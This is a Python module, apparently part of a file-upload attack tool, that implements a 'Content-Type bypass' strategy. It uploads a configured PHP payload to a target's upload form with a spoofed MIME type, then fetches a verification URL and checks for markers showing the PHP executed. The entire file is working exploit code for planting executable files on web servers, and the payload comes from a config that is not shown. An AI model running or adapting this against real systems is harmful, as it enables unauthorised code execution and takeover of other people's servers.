from .base import Strategy
from core.common import build_url, marker_result
from core.models import StrategyResult
class MimeStrategy(Strategy):
    name = "mime"
    def run(self, session, csrf, config, logger):
        logger.info("Technique 2: Content-Type bypass")
        data = {config.UPLOAD_USER_FIELD: config.UPLOAD_USERNAME}
        if csrf: data[config.UPLOAD_CSRF_FIELD] = csrf
        files = {config.UPLOAD_FILE_FIELD: (config.MIME_FILENAME, config.PHP_PAYLOAD.encode(), config.MIME_CONTENT_TYPE)}
        try:
            r = session.post(build_url(config.TARGET, config.UPLOAD_URL), data=data, files=files, timeout=config.TIMEOUT, verify=config.VERIFY_TLS, allow_redirects=config.FOLLOW_REDIRECTS)
            logger.info(f"Upload response: HTTP {r.status_code}")
            if r.status_code >= 400: return StrategyResult(False, self.name, f"Upload rejected: HTTP {r.status_code}")
            verify_url = build_url(config.TARGET, config.MIME_VERIFY_URL)
            v = session.get(verify_url, timeout=config.TIMEOUT, verify=config.VERIFY_TLS, allow_redirects=config.FOLLOW_REDIRECTS)
            return marker_result(self.name, v, verify_url, config.SUCCESS_MARKER, config.END_MARKER, config.MIME_FILENAME)
        except Exception as exc: return StrategyResult(False, self.name, str(exc))
